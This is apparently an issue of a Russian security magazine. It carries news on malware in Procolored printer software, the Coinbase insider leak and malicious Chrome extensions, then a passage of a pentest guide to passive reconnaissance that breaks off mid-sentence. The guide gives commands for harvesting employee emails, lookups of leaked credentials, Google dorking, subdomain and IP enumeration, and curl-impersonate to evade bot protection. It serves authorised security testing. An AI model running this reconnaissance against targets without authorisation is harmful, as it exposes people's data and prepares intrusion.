     Первым малварь в ПО Procolored заметил  ютубер Кэмерон Ковард
  (Cameron Coward), известный под ником Serial Hobbyism. Его антивирус пре‐
   дупредил о наличии USB-червя Floxif при установке сопутствующего софта
  и драйверов для принтера Procolored V11 Pro.
    По словам Коварда, он попытался связаться с компанией Procolored,
   однако производитель отрицал наличие малвари в своем ПО, заявляя, что
   антивирусы могут генерировать ложные срабатывания:

          Если я пытаюсь загрузить файлы с их сайта или распаковать файлы
         с USB-накопителя (который поставлялся в комплекте), мой компьютер «
         немедленно помещает их в карантин.                 »
   Согласно анализу, проведенному исследователями из компании G Data, офи‐
   циальные пакеты ПО Procolored  действительно распространяли малварь
  и это длилось не менее шести месяцев.
      Эксперты обнаружили, что софт еще как минимум для шести моделей
   принтеров (F8, F13, F13 Pro, V6, V11 Pro и VF13 Pro), лежащий в файлооб‐
   меннике Mega,  содержит  вредоносное ПО.  Отмечается,  что  компания
   Procolored  использует Mega для  хранения  своего  программного  обес‐
   печения, а раздел поддержки на официальном сайте содержит прямые ссыл‐
   ки на файлообменник.
    В общей сложности аналитики нашли 39 файлов, которые были заражены
   следующими вредоносами:
   • XRedRAT —  малварь, ранее  изученная  экспертами  eSentire. Может
      использоваться для перехвата нажатий клавиш, создания снимков экрана,
      удаленного шелл‑доступа и манипулирования файлами. Жестко закоди‐
     рованные   адреса  управляющих   серверов   соответствуют   старым
     образцам;
   • SnipVex — ранее неизвестный клиппер, который заражает файлы .exe,
      прикрепляется к ним и подменяет BTC-адреса в буфере обмена. Обна‐
     ружен в нескольких загруженных файлах. Предположительно этим вре‐
     доносом  заражены  системы  разработчиков  Procolored  или машины
     для сборки.

   Поскольку файлы последний раз обновлялись в октябре 2024 года, можно
   предположить, что малварь поставляется вместе с официальным софтом
   Procolored не менее полугода.
      Отмечается, что на адрес, который SnipVex использует для получения кра‐
  деной криптовалюты, поступило 9,308 BTC, то есть около миллиона долларов
  по текущему курсу.
       Хотя после исходного предупреждения ютубера представители Procolored
  все отрицали, 8 мая 2025 года компания удалила зараженные программные
  пакеты и начала внутреннее расследование.
      Когда специалисты G Data обратились к производителю за объяснениями,
   в Procolored признались, что могли загрузить файлы на Mega.nz с помощью
   USB-накопителя, который был заражен Floxif.

       В качестве меры предосторожности с официального сайта Procolored
        было временно удалено все программное обеспечение, — сообщили «
         в Procolored. — Мы проводим всестороннюю проверку каждого файла
         на наличие вредоносного ПО. Только после прохождения строгих про‐
         верок программное обеспечение будет опубликовано снова.                 »
   Эксперты G Data уже изучили «чистые» программные пакеты Procolored и под‐
   твердили, что они безопасны для использования. Теперь всем пользователям
   Procolored рекомендуется как можно скорее заменить старое ПО новыми
   версиями и выполнить сканирование своих систем для удаления XRedRAT
  и SnipVex.


  FIREFOX НЕ ВЫЖИВЕТ БЕЗ GOOGLE





    Разработчики Mozilla рассказали, что прекращение финансирования со стороны Google может
   поставить под угрозу само существование браузера Firefox.
       Дело в том, что недавно финансовый директор Mozilla Эрик Мюльхейм (Eric Muhlheim)
   давал показания в рамках антимонопольного разбирательства по делу США против Google LLC.
  В компании решили более детально объяснить позицию Мюльхейма в частности и Mozilla
   в →целом:  Не секрет, что доходы от поиска составляют большую часть годового дохода
            Mozilla. Firefox — независимый браузер, у нас нет собственной ОС, устройств
         или магазина приложений. Без этого дохода Mozilla и другие независимые бра‐
           узеры будут вынуждены сократить масштабы своей деятельности и урезать под‐
           держку таких важных проектов, как Gecko, единственного браузерного движка,
           конкурирующего с Chromium от Google и WebKit от Apple.
              Инновации, конфиденциальность и выбор пользователя могут процветать
         лишь тогда, когда браузерные движки конкурируют. Без этого пропадет стимул
          делать интернет более быстрым, безопасным или инклюзивным. Если мы
           потеряем или ослабим Gecko, интернет будет оптимизирован на коммерческие
          бизнес‑модели и их приоритеты, а не на ценности, которые отстаивает Mozilla:
           конфиденциальность, доступность и выбор пользователя. Открытый веб оста‐
          ется открытым лишь в том случае, если сайты, приложения и контент взаимо‐
            действуют и работают везде.
             Подлинное улучшение условий конкуренции и выбора не может решать одну
          проблему за счет создания другой.


   Кроме того, после показаний Мюльхейма высказалась и глава Mozilla Лора Чемберс (Laura
   Chambers), которая подчеркнула, что это разбирательство «определит ландшафт конкуренции
   в →интернетеЛюбоена долгиесредствогоды правовойвперед». Чемберсзащиты должнообъясняет:укреплять, а не ослаблять незави‐
         симые альтернативы, на которые люди полагаются в поисках конфиденциаль‐
            ности, инноваций и выбора.
              Небольшие независимые браузеры, такие как Firefox, полагаются на монети‐
         зацию через поисковые партнерства, которые позволяют поддерживать нашу
          работу и инвестировать в инновации, ориентированные на  пользователей.
         Без этих партнерств мы столкнулись бы с серьезными ограничениями, которые
         не только помешали бы нам расти, но и лишили бы возможности предоставлять
           некоммерческую альтернативу Chrome, Edge и Safari.
              Подход Mozilla к поиску строится на предоставлении людям выбора. Мы
           неоднократно сталкивались с тем, что люди покидают наш браузер, если им
          навязывают поисковую систему, которая им не нравится. Без поисковых пар‐
          тнерств независимые браузеры, такие как Firefox и браузерный движок Gecko
          от Mozilla, столкнутся с серьезными ограничениями.
         Мы признаем важность повышения конкуренции в поисковой среде. Однако
          это не должно происходить за счет конкуренции браузеров. Мы считаем, что суд
           должен гарантировать, что небольшие и независимые браузеры не пострадают
         при принятии окончательного решения. Без этого мы рискуем променять одну
          монополию на другую, и живой, ориентированный на людей веб, за который мы
         боролись десятилетиями, может начать исчезать.





 СОТРУДНИКИ
 COINBASE ПРОДАЛИ
 ДАННЫЕ
 ПОЛЬЗОВАТЕЛЕЙ
   Криптобиржа Coinbase, которой пользуются более 100 миллионов человек,
   сообщила, что недобросовестные сотрудники службы поддержки продали
   киберпреступникам данные  клиентов. Хакеры потребовали выкуп в  раз‐
  мере 20 миллионов долларов за неразглашение украденной информации.
    В Coinbase заявили, что не будут платить. Вместо этого биржа учредила
   специальный фонд для выплаты вознаграждения в размере 20 миллионов
   долларов за любую информацию, которая поможет найти злоумышленников,
   организовавших эту атаку.
     11 мая 2025 года хакеры направили руководству Coinbase письмо с угро‐
  зами и требованием выкупа в размере 20 миллионов долларов. В противном
   случае они угрожали слить в открытый доступ украденную информацию
  о некоторых клиентских счетах и внутреннюю документацию.
      Согласно официальному заявлению биржи, хакеры получили эту информа‐
  цию от подрядчиков и сотрудников службы поддержки, которые находились
  за пределами США. Злоумышленники заплатили инсайдерам за  доступ
   к внутренним системам компании.
      Когда о случившемся стало известно, все торговавшие информацией сот‐
   рудники были уволены. При этом не сообщается, в какой именно стране
   работали инсайдеры.
      Изначально заявлялось, что в руках хакеров оказались персональные дан‐
  ные примерно 1% клиентской базы Coinbase (около миллиона человек).
   Однако в уведомлении об утечке, направленном в Генеральную прокуратуру
   штата Мэн, представители Coinbase сообщили о 69 461 пострадавшем.
      Подчеркивается, что злоумышленникам не удалось похитить приватные
   ключи или пароли клиентов, а также получить доступ к счетам Coinbase Prime,
  горячим и холодным кошелькам пострадавших или самой биржи.
      Зато среди украденных данных были:
   • имена, адреса, телефоны и email-адреса;
   • замаскированные номера социального страхования (только последние
     четыре цифры);
   • замаскированные номера банковских счетов и некоторые банковские
      идентификаторы;
   • изображения удостоверений личности (например, водительских прав, пас‐
      портов);
   • данные о счетах (снапшоты баланса и истории операций);
   • некоторые  корпоративные  данные  (включая  документы,  обучающие
     материалы и сообщения, доступные агентам службы поддержки).


           Киберпреступники подкупили и завербовали группу иностранных сот‐
          рудников службы технической поддержки, чтобы те похитили данные «
          клиентов Coinbase для проведения атак с использованием социальной
         инженерии, —  говорится  в  официальном  заявлении  Coinbase. —
         Пароли, приватные ключи и средства пользователей не пострадали,
         а также инцидент не коснулся счетов Coinbase Prime. Мы возместим
         все убытки клиентам, которых обманом вынудили отправить средства
          злоумышленникам.                 »
   Представители Coinbase не сообщили, сколько именно клиентов пострадали
   от атак с использованием социальной инженерии и перевели деньги мошен‐
   никам. По оценкам компании, расходы на устранение последствий этого
   инцидента и возмещение ущерба клиентам составят от 180 до 400 мил‐
  лионов долларов США.
    В компании заявили, что вскоре Coinbase откроет новый центр поддержки
   в США, возместит все расходы пострадавшим и увеличит инвестиции в обна‐
   ружение внутренних угроз, а также моделирование и автоматизацию реаги‐
   рования на угрозы, чтобы предотвратить подобные утечки в будущем.
      Клиентам рекомендуется сохранять бдительность, так как злоумышленни‐
   ки могут пытаться выдать себя за сотрудников Coinbase, обманом заставить
   перевести средства или запрашивать конфиденциальную информацию, нап‐
  ример пароли или коды двухфакторной аутентификации.


 39% РОССИЙСКИХ ПОЛЬЗОВАТЕЛЕЙ СЧИТАЮТ, ЧТО ИХ
 ПЕРСОНАЛЬНЫЕ ДАННЫЕ СКОМПРОМЕТИРОВАНЫ
    Эксперты BI.ZONE и  СберМаркетинга  провели  исследование, в котором  приняли  учас‐
   тие 800 россиян из городов с населением больше 100 тысяч человек. Большинство опрошен‐
   ных ( 92% ) заявили, что обеспокоены безопасностью персональных данных, которые хранятся
   в организациях. Каждый второй ( 51% ) слышал об утечках в компаниях, услугами которых поль‐
    зуется. А примерно каждый третий ( 39% ) считает, что его персональные данные уже скомпро‐
   метированы.

   Однако, несмотря на опасения и широкую огласку утечек, 81% опрошенных готовы предос‐
   тавить свои данные в обмен на участие в программах лояльности и другие выгоды. Причем
  18% к этому готовы в любом случае, а 63% — в зависимости от того, насколько доверяют кон‐
   кретной организации.





 НЕТ
 АДМИНИСТРАТОРУ
 В CHROME
  Изменения в Chromium не позволят браузеру Chrome запускаться от имени
   администратора.  Разработчики  объясняют,  что  эта  мера  направлена
  на повышение безопасности Windows.
    Еще в 2019 году компания Microsoft внедрила подобную функциональ‐
   ность в браузер Edge. Когда пользователи запускали Edge с повышенными
   правами, появлялось предупреждение, рекомендующее заново перезапус‐
   тить его без привилегий администратора. Позже Microsoft изменила эту фун‐
  кцию таким образом, чтобы запуск Edge с повышенными правами стал невоз‐
  можен в целом.
      Теперь аналогичные изменения появятся в Chromium, а разработчики
   Microsoft уже отправили соответствующий коммит. В Microsoft объясняют, что
  Chrome  будет  автоматически понижать  привилегии, если  пользователь
   попытается запустить его с повышенными правами.

           Автоматическое понижение прав пользователей, запускающих Chrome
         с повышенными  привилегиями. Этот CL  основан на  изменениях, «
        которые мы внесли в Edge: начиная с 2019 года браузер пытается
           автоматически понизить права, если запускается с повышенным уров‐
        нем split/linked-токена, — пишет разработчик Microsoft Edge Стефан
         Смолен (Stefan Smolen). — Это означает, что он автоматически пыта‐
         ется перезапустить браузер еще раз, а затем, если попытка не уда‐
          лась, возвращается к текущему поведению (запуск с правами адми‐
           нистратора).                 »
   Кроме того, Microsoft добавила параметр командной строки -do-not-de-
   elevate,  чтобы  предотвратить  понижение  прав  после  автоматического
   перезапуска и избежать бесконечных циклов.
     Эта функциональность не работает для процессов Chrome, запущенных
  с повышенными правами в режиме автоматизации, чтобы не мешать работе
   инструментов, которые должны запускаться автоматически.
    В Microsoft напоминают, что запускать браузер с правами администра‐
  тора — не очень хорошая идея в целом. Ведь когда Chrome запускается
   от имени администратора, он наследует повышенные привилегии и все, что
   загружается и открывается через браузер, также запускается с правами
   администратора и несет серьезную угрозу безопасности.


 МОШЕННИКИ ПОХИТИЛИ У ГРАЖДАН 6,9 МИЛЛИАРДА
  РУБЛЕЙ
   Согласно статистике, опубликованной Банком России, в период с января по март 2025 года
   злоумышленникам удалось совершить 296 600 мошеннических операций, похитив у клиентов
    российских банков 6,9 миллиарда рублей.

   При этом удалось  предотвратить 43,8 миллиона попыток мошенников похитить деньги
   со счетов пользователей и спасти 4,6 триллиона рублей. Это более чем в два раза пре‐
   вышает среднее значение за 2024 год.


   Больше всего денег было похищено через каналы дистанционного банковского обслуживания
   (например, онлайн‑банкинг и переводы ).





 ОПАСНЫЕ
 РАСШИРЕНИЯ
 CHROME
   Аналитики DomainTools Intelligence (DTI) обнаружили более 100 вредоносных
  расширений для браузера Chrome, замаскированных под VPN, ИИ‑ассистен‐
  ты и криптоутилиты. Расширения используются для кражи файлов cookie
  и скрытого выполнения удаленных скриптов.
    По словам экспертов, неизвестные злоумышленники распространяют эти
  расширения с февраля 2024 года.


          Злоумышленники создают сайты, имитирующие легитимные сервисы:
           инструменты   для   повышения   производительности,   помощники «
         для создания и анализа рекламы и медиафайлов, VPN-сервисы, крип‐
           тоинструменты, банковские сервисы и многое другое. Такие сайты
         побуждают пользователей установить соответствующие вредоносные
         расширения из Chrome Web Store.                 »
   Некоторые из обнаруженных сайтов‑приманок выдавали себя за легитимные
   продукты и сервисы, включая DeepSeek, Manus, DeBank, FortiVPN, YouTube
  и  Site  Stats, чтобы убедить пользователей  загрузить и установить  рас‐
  ширения.
      После  этого  злоумышленники собирают из  браузера файлы  cookie,
   получают произвольные скрипты с удаленного сервера и устанавливают
  WebSocket-соединения для работы в качестве прокси и маршрутизации тра‐
   фика.
    На первый взгляд расширения действительно выполняют заявленные фун‐
   кции, однако при этом они воруют учетные данные и файлы cookie, перех‐
   ватывают  сеансы,  внедряют в  браузер  рекламу,  создают  вредоносные
   перенаправления, манипулируют трафиком и занимаются фишингом, манипу‐
  лируя DOM.
     Кроме того, расширения настроены на предоставление себе чрезмерных
  прав через файл manifest.json, что позволяет им взаимодействовать с каждым
  посещаемым сайтом, выполнять произвольный код, полученный с контро‐
   лируемого злоумышленником домена, осуществлять вредоносные редиректы
  и даже внедрять на страницы рекламу.
     Расширения используют обработчик события onreset в DOM (Document
   Object Model) для выполнения кода, вероятно, в попытке обойти CSP (Content
   Security Policy).
      Пока  неясно,  как  именно  жертв  заманивают  на  фиктивные  сайты,
  но  исследователи  предполагают,  что для  этого  используются обычные
  методы, включая фишинг и публикации в социальных сетях.

           Поскольку расширения появляются как в Chrome Web Store, так и на
           сайтах, они могут отображаться в результатах обычного веб‑поиска «
        и при поиске в магазине Chrome, — объясняют аналитики. — Многие
         из сайтов‑приманок использовали трекинг ID Facebook (запрещена
         в России. Принадлежит компании Meta, которая признана экстремист‐
         ской и запрещена на территории РФ), что наводит на мысль о том,
         что они используют приложения Facebook/Meta (деятельность Meta
          Platforms признана  экстремистской и запрещена в РФ) для  прив‐
         лечения   посетителей.   Возможно,   расширения   продвигаются
         с помощью страниц в Facebook, групп и даже рекламы в соцсети.                 »
  На данный момент неизвестно, кто стоит за этой вредоносной кампанией.
  Получив информацию от исследователей, инженеры Google удалили из офи‐
   циального магазина почти все опасные расширения.
     Полный список вредоносных доменов с рекламой расширений доступен
  на GitHub DTI.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
   Взломан форк Signal, которым пользуются в администрации Дональда Трампа


   Старые роутеры используются для создания прокси‑ботнетов


   Новые учетные записи Microsoft будут беспарольными по умолчанию


  В сеть попал билдер вымогательской малвари VanHelsing


  ФБР и Microsoft отключили 2300 доменов, связанных со стилером Lumma


   Claude Opus 4 шантажирует создателей, а ChatGPT o3 отказывается отключаться


    Атаки ClickFix теперь применяют против пользователей Linux


   Signal блокирует работу Windows Recall


   Майнер Dero массово заражает контейнеры через открытые API Docker


    Баги в процессорах Intel приводят к утечке данных из привилегированной памяти
COVERSTORY





Пассивная  разведка  позволяет  собрать
данные о цели с минимальными рисками
обнаружения. Это важный этап в пентестах
и прочих offensive-проектах. Эта статья —
пошаговое руководство от сбора доменов,             aleksey_vi@bk.rualekvi
IP-адресов и утекших данных до поиска уяз‐
вимостей. Имея перед глазами четкий план
действий, можно эффективнее готовиться
к следующим этапам.


На просторах интернета — как в русскоязычном сегменте, так и в иностран‐
ном — очень много крутых материалов, однако я не находил универсальных
пошаговых инструкций, которые охватывали бы весь процесс от начала и до
конца, особенно в части проведения активной и пассивной разведки на этапе
формирования поверхности атаки.
   Поэтому я попытался выстроить универсальный рабочий процесс, который
мог бы как‑то унифицировать базовые проверки. Точнее, настолько универ‐
сальный, насколько это возможно.
  Я постарался сделать статью понятной и интересной для специалистов
с любым уровнем и бэкграундом. Я добавлял в воркфлоу такие проверки,
которые, на мой взгляд, необходимо проводить почти на любом проекте —
будь то Red Team, пентест или анализ защищенности.
   Конечно, любой воркфлоу будет сильно зависеть от того, какие данные
есть на начальном этапе. Например, если это анализ защищенности конкрет‐
ного веб‑приложения, то алгоритм действий один, а если пентест, на котором
нам ничего не известно, кроме названия компании или основного домена, то
другой.
  Я старался исходить из того, что на старте нам известен самый минимум.
Если в твоей задаче есть какие‑то другие вводные данные и, например, спи‐
сок доменов уже известен, то просто пропускай до нужного места.
   Наши методы и сценарии будут по возможности пассивными, но среди них
могут попадаться и подразумевающие какое‑то минимальное взаимодей‐
ствие. Об этом я буду предупреждать сразу же — пометкой «взаимодей‐
ствие» на случай, если тебе нужно полное отсутствие активных действий.


СТРУКТУРА ПАПОК

Поскольку мы будем использовать в подавляющем большинстве случаев кон‐
сольные утилиты, нам нужно хранить полученную информацию так, чтобы
в ней не запутаться. На первый взгляд это кажется легкой задачей, а на деле
зачастую возникает путаница. Так как у нас цикл статей, я решил вместо
общей структуры показать пример возможного варианта в конце каждого
пройденного этапа.
   Разумеется, в идеальном мире все это будет автоматизировано и станет
храниться непосредственно в базе данных, откуда информация подгружается
на красивые дашборды... Но мы не в идеальном мире, поэтому продолжим
работать в привычном формате.


ИСПОЛЬЗУЕМЫЙ СОФТ

Здесь я кратко опишу часто используемые утилиты. Некоторые из них мало‐
известны, поэтому неплохо будет сказать пару слов о том, как и для чего они
применяются:
 • anew служит для добавления в файл уникальных строк из stdin ;
 • html-tool используется для анализа ответов сервера;
 •  fff мы будем использовать для сохранения заголовков и тела ответа в фай‐
   лы;
 • inscope позволяет исключать все, что за пределами скоупа;
 • paramrep был мной разработан в качестве аналога для qsreplace . Утилита
   qsreplace мне не понравилась тем, что она изменяет абсолютно все
   параметры  в URL  сразу  (это  делает  результат  непредсказуемым),
   а paramrep подменяет параметры по одному;
 • curl-impersonate —  усовершенствованный  curl.  Позволяет  обходить
   защиту от ботов, изображая легитимный браузер, в том числе путем под‐
  мены JA3-фингерпринта, что в последнее время все актуальнее.

Для inscope нужно создать в корневом каталоге проекта файлик .scope при‐
мерно с таким содержимым:


.*\.example\.com$
^example\.com$


ЦЕЛИ

Глобально на этапе пассивной разведки перед нами стоят следующие цели:
 • познакомиться с таргетами, понять, насколько они большие и архитек‐
   турно сложные, какие технологии используются;
 • собрать список поддоменов;
 • собрать живые поддомены;
 • получить несколько опциональных файлов для ручного анализа;
 • собрать список IP-адресов;
 • получить список URL-адресов из разных источников в пассивном режиме;
 • посмотреть в пассивном режиме порты и сервисы;
 • проверить в пассивном режиме уязвимости;
 • изучить утечки учетных данных;
 • собрать из открытых источников список email-адресов.


ПЕРВОЕ ЗНАКОМСТВО

Обычно перед стартом работ я делаю несколько простых шагов, которые
никак не связаны с общим процессом. Делаются они исключительно для того,
чтобы  получить  начальное  представление о  цели.  Первыми они  идут
условно — их можно и нужно проводить повторно, когда будет больше
информации.


Букмарклет для сбора URL (взаимодействие)
Свое первое знакомство с таргетом я предпочитаю начинать с беглого взгля‐
да на цель с помощью специально заготовленной JavaScript‑закладки. Она
выводит список уникальных адресов, найденных на текущей странице.


             INFO

                            Букмарклет — это фрагмент кода на JavaScript,
                          сохраненный в виде  закладки  браузера. Если
                       нажать  на  него,  он  запустится  на  текущей
                         веб‑странице  и  что‑то  сделает.  Это  никак
                       не триггерит целевую систему: по сути, мы прос‐
                         то один раз зашли на страницу, как сделал бы
                     любой легитимный клиент.


Вот код букмарклета:


javascript:(async function(){let scanningDiv=document.createElement("
div");scanningDiv.style.position="fixed",scanningDiv.style.bottom="0"
,scanningDiv.style.left="0",scanningDiv.style.width="100%",
scanningDiv.style.maxHeight="50%",scanningDiv.style.overflowY="scroll
",scanningDiv.style.backgroundColor="white",scanningDiv.style.color="
black",scanningDiv.style.padding="10px",scanningDiv.style.zIndex="
9999",scanningDiv.style.borderTop="2px solid black",scanningDiv.
innerHTML="<h4>Scanning...</h4>",document.body.appendChild(
scanningDiv);let e=[],t=new Set;async function n(e){try{const t=await
fetch(e);return t.ok?await t.text():(console.error(`Failed to fetch
${e}: ${t.status}`),null)}catch(t){return console.error(`Error
fetching ${e}:`,t),null}}function o(e){if(!(e.startsWith("/")||e.
startsWith("./")||e.startsWith("../")))return!1;if(e.includes(" ")||/
[^\x20-\x7E]/.test(e))return!1;if(e.length<2||e.length>=200)return!1;
if(e.includes("{")||e.includes("}")||e.includes(":")||e.includes("?")
||e.includes("*")||e.includes("(")||e.includes(")")||e.includes("[")
||e.includes("]"))return!1;return!0}function s(e){return[...e.
matchAll(/[%27"]((?:\/|\.\.\/|\.\/)[^%27"]+)[%27"]/g)].map(e=>e[1]).
filter(o)}async function c(o){if(t.has(o))return;t.add(o),console.log
(`Fetching and processing: ${o}`);const c=await n(o);if(c){const t=s(
c);e.push(...t)}}const l=performance.getEntriesByType("resource").map
(e=>e.name);console.log("Resources found:",l);for(const e of l)await
c(e);const i=[...new Set(e)];console.log("Final list of unique paths:
",i),console.log("All scanned resources:",Array.from(t)),scanningDiv.
innerHTML=`<h4>Unique Paths Found:</h4><ul>${i.map(e=>`<li>${e}</li>`
).join("")}</ul>`})();

Как установить и использовать этот букмарклет:
 • добавь новую закладку на панель закладок в браузере;
 • замени URL закладки фрагментом кода на JavaScript;
 • открой целевую страницу и щелкни по букмарклету;
 • если не сработало, поищи разрешение запускать букмарклеты в настрой‐
   ках безопасности браузера.





                                  Результат запуска


Онлайновые сервисы
В продолжение знакомства с целью мы можем использовать онлайновые
сервисы для поиска информации о сайте:
 • suip.biz — неплохо подойдет для поиска поддоменов;
 • coolakov.ru/tools/ping —   позволяет   быстро   смотреть   статус‑коды
   по доменам и поверхностно ознакомиться с заголовками; более деталь‐
  ный анализ я опишу далее.

Этот этап занимает немного времени, но уже на нем ты познакомишься
с  целью  и  потенциально  выявишь  такие  уязвимости,  как,  например,
subdomain takeover.


ПРОВЕРЯЕМ УТЕЧКИ

Для общего понимания системы и обогащения информации неплохо было бы
посмотреть утечки учетных данных пользователей или сотрудников нашей
цели. Обычно этот тип проверок выделяют в отдельный вид работ, которым
занимаются специалисты по OSINT. Я приведу несколько ресурсов для при‐
мера (на самом деле их намного больше):
 • бесплатный сервис: proxynova.com/tools/comb/ ;
 • платный сервис: snusbase.com .


СОБИРАЕМ ПОЧТЫ

Далее нам было бы неплохо поискать корпоративные учетные записи поль‐
зователей, что в дальнейшем также может пригодиться при проведении
работ на этапе активного анализа.


EmailHarvester
EmailHarvester — одна из утилит для поиска и сбора email-адресов.
   Ниже приведена bash-команда для запуска утилиты и поиска по списку
доменов:


(trap 'kill 0' SIGINT; while IFS= read -r domain; do target_name=$(
echo $domain | sed "s/[^a-zA-Z0-9]/_/g"); echo "Starting
EmailHarvester for $domain"; python3 EmailHarvester.py -d "$domain"
-s "email_${target_name}.txt"; done < ~debian/Desktop/scope)


LinkedIn
Думаю, все знают такой ресурс для IT-специалистов, как LinkedIn. С его
помощью мы можем спарсить email-адреса сотрудников интересующей нас
компании. Ниже приведен пример работы неплохой утилиты CrossLinked ,
которая справляется с этой задачей (и, кстати, не требует ни учетной записи,
ни API-ключа).
   Пример команды для запуска:


python3 crosslinked.py -f '{first}.{last}@example.ru' "Рога и Копыта"

Тут я предлагаю сделать небольшую паузу и обратить внимание на то, что
у нас уже есть на данный момент:
 • эндпоинты на целевом ресурсе;
 • список утекших учетных данных;
 • поверхностное понимание ландшафта, составленное по активным под‐
   доменам, без глубокого изучения;
 • список email-адресов сотрудников компании.


TLD И ROOT DOMAINS

В этом разделе и далее мы начнем заниматься, как сейчас модно говорить,
Attack Surface Managed . Пришло время приступить к сбору активов
исследуемой компании и формированию поверхности атаки.


Онлайн
Бывают ситуации, когда заказчик не предоставляет полный список под‐
доменов компании. Тогда нам нужно самостоятельно найти домены, связан‐
ные с нашим таргетом. В этом может помочь довольно известный онлай‐
новый сервис whoxy.com , который предоставляет много полезной информа‐
ции по исследуемой цели.





Из командной строки
Скажу сразу, что, несмотря на мою любовь к CLI, этот метод мне не очень
понравился, так как приходится перепроверять валидность большого объема
информации. Вдобавок необходимость поиска TLD (Top Level Domain) в рам‐
ках проектной деятельности встречается довольно редко. Но все же утилита
tldfinder стоит упоминания.
   Пример команды:


tldfinder -d google -dm tld | anew domains

Я, впрочем, предпочитаю whoxy.com .
   Именно на этом этапе формируется файл scope . В него мы помещаем
либо домены, относящиеся к компании, либо домены, предоставленные
заказчиком. Это важно для дальнейшей работы.


СОБИРАЕМ IP-АДРЕСА

Если компания большая и у нее есть собственный пул IP-адресов, выполняем
следующие шаги.


Поиск номера AS
Чтобы узнать ASN, сначала резолвим в IP:


nslookup example.com

Ответ будет выглядеть примерно так:



  Non-authoritative answer:
  Name:   example.com
  Address: 111.111.111.111
  Name:   example.com
  Address: 112.112.112.112


Смотрим Whois:


whois 111.111.111.111
whois 112.112.112.112

Вывод будет примерно такой:



  domain:        EXAMPLE.COM
  nserver:       ns4-l2.abc.com.
  nserver:       ns8-l2.abc.com.
  nserver:       nsz501s1.example.com. 111.111.111.2
  nserver:       nsz502s1.example.com. 111.111.111.3
  nserver:       nsz503s1.example.com. 111.111.111.4
  state:         REGISTERED, DELEGATED, VERIFIED
  org:           LLC "Roga and Koputa"
  taxpayer-id:   7704211234
  registrar:     ocean-com
  admin-contact: https://www.didgitalocean.com/whois
  created:       1998-02-09T07:45:50Z
  paid-till:     2025-02-28T21:00:00Z
  free-date:     2025-04-01
  source:        TCI


Далее мы можем поискать в базе данных BGP информацию по подсетям.
   Если нашли ASN, то ищем по нему :


https://bgp.he.net/AS11111#_prefixes

Если не нашли, то можем просто посмотреть по IP :


https://bgp.he.net/ip/111.111.111.1

Поиск по домену :


https://bgp.he.net/dns/example.com#_ipinfo


Ripe — ситуативно
Если вдруг так вышло, что результаты из BGP нас каким‑то образом не удов‐
летворили, можно поискать в БД Ripe.
   Поиск по доменному имени example.com:


https://apps.db.ripe.net/db-web-ui/query?bflag=false&dflag=false&
rflag=true&searchtext=examle.com&source=RIPE&types=inetnum

Поиск по организации ORG-PIS111-RIPE:


https://apps.db.ripe.net/db-web-ui/query?bflag=false&dflag=false&
rflag=true&searchtext=-i%20org%20ORG-PIS111-RIPE&source=ripe


ASNmap
Когда нашли номер AS, в качестве неплохой и более простой альтернативы
можно использовать консольную утилиту ASNmap , которая покажет все под‐
сети по определенному номеру AS.
   Пример команды:


asnmap -a AS11111 -silent | anew subnet

Формируем список IP-адресов для удобного дальнейшего взаимодействия
с ним:


nmap -sL -n -iL subnet | awk '/Nmap scan report/{print $NF}' | grep
-E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$" > ip_list

Добавлю, что все‑таки рекомендую сверять результаты BGP/RIPE и ASNmap,
чтобы точно ничего не упустить.


ИЩЕМ ПОДДОМЕНЫ

После того как мы собрали список IP-адресов компании, настало время
для сбора поддоменов.


Google Dorks
Первое, с чего хотелось бы начать рассказ о поиске доменных имен, принад‐
лежащих компании, — это Google Dorks. Для многих это может показаться
пережитком прошлого или даже чем‑то попсовым, но их не стоит недооце‐
нивать. Например, недавно, проводя некоторые исследования, я обнаружил
с их помощью на правительственном портале Республики Чехии открытый
доступ к Elasticsearch с Kibana.


             INFO

                        Подробнее о Google Dorks читай в статьях « Ис‐
                         пользуем малоизвестные функции Google, чтобы
                            найти сокрытое » и « Google как средство взлома.
                          Разбираем  актуальные  рецепты  Google  Dork
                         Queries ».



Google Dorks Online
Думаю, многие из тех, кто интересуется кибербезопасностью, сталкивались
с подобными онлайн‑сервисами для использования дорков:
 • Pentest-Tools: Google Hacking ;
 • Taksec Google Dorks Bug Bounty ;
 • Dorks от Faisal ;
 • Bug Bounty Search Engine .

Однако я, как человек, который очень любит Linux и, в частности, работу в тер‐
минале, не особенно ценю эти сервисы по нескольким причинам:
 1. Крайне  неудобно  работать  с  результатами,  которые мы  получаем
   на выходе.
 2. Нет возможности дополнить имеющиеся дорки чем‑то своим — нас
   вынуждают использовать только то, что автор уже изначально заложил
   по своему усмотрению.


GoogleDorker
Я рекомендую использовать утилиту GoogleDorker. Сами дорки можно найти
где угодно, ниже приведены лишь пара примеров:
 • Dorks Collections List ;
 • Exploit-DB: Google Hacking Database .

Пример запуска с загрузкой дорков из файла:


dorker -l queries_dork.txt | anew url_dorks.txt

Одиночный запрос:


dorker -q "inurl:api site:bentley.com"





                        GoogleDorker в действии

Если  у нас  несколько доменов  второго  уровня,  то,  чтобы каждый раз
не редактировать файл с дорками, можем воспользоваться командой ниже
и заменять значение site :


sed -i 's/^site:[^ ]*/site:example.com/' queries_dork.txt


Fast Google Dork Scanner
Это довольно неплохой вариант для работы с дорками прямо в Docker,
но есть нюансы. Эта утилита:
 • не предназначена для работы с API Google;
 • использует захардкоженные дорки;
 • работает в Docker.

Команда для Docker:


docker build -t google_dork_ .

Команда для запуска:


docker run -it --rm google_dork_  domain.com


Собираем поддомены в Google
Когда наш поиск в Google завершился, мы можем выделить оттуда список
уникальных доменов.
   Пример команды для поиска уникальных поддоменов:


cat urls_dorks.txt | grep -oP 'https://\K[^/]+' | anew subdomains_
dorks





                          Пример результата


Обратный резолв записей PTR (взаимодействие)
После того как мы собрали список IP-адресов, относящихся к компании,
можем попробовать поискать PTR-записи и проверить обратный резолв:
какие IP-адреса резолвятся в какие доменные имена. Это очень удобно
делать с помощью утилиты Project Discovery dnsx .
   Пример команды для запуска:


echo "111.111.111.0/24" | dnsx -ptr -resp | anew ptr

Вывод только доменных имен:


cat subnet | dnsx -ptr -resp | sed 's/\x1b\[[0-9;]*m//g' | awk '{
print $NF}' | tr -d '[]' | anew subdomain_ptr_all.txt

Далее из списка полученных поддоменов достанем только домены второго
уровня и добавим уникальные значения в файл с доменами.


cat subdomain_ptr_all.txt | rev | cut -d . -f 1,2 | rev | sort

В списке могут оказаться доменные имена второго уровня, которые не имеют
